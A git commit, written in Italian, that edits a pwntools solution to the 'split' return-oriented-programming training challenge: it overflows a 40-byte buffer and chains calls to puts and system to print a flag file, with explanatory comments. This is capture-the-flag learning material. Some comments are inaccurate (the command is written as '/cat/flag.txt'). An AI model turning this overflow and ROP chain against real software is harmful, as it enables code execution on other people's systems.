d8884beec457be1b7ccb058fc50666fce2011a5a
Alessandro Massarenti <48263116+alessandro-massarenti@users.noreply.github.com>
2021-12-11 17:22:03 +0100

    Non veniva eseguito il comando system
    Senza l'istruzione puts la chain non riusciva a mandare l'istruzione "system".
    
    Ho aggiunto anche qualche commento che mi sembra possa essere utile per comprendere il programma

--- 20211203_ROP/1_split/solution.py
+++ 20211203_ROP/1_split/solution.py
@@ -1,9 +1,21 @@
 from pwn import *
 
+
 context.binary = "./split"
 e = ELF("./split")
+
+#stampa l'indirizzo da poter confrontare con cutter o strings per vedere se è la stringa giusta
+print(hex(e.symbols['usefulString']))
+
 r = ROP(e)
 p = e.process()
-r.call("system", [e.symbols["usefulString"]])
-p.send(b"A" * 8 * 5 + r.chain())
-log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
+
+#apre la vulnerabilità
+r.call("puts",[e.symbols['usefulString']])
+
+#chiama system per fare una chiamata di sistema con l'istruzione "/cat/flag.txt"
+r.call("system",[e.symbols['usefulString']])
+
+#40 è la dimensione del buffer, sopra 40 andiamo in overflow
+p.send(b"A" * 40 + r.chain())
+log.success(p.recvline_regex(b".*{.*}.*").decode("ascii"))
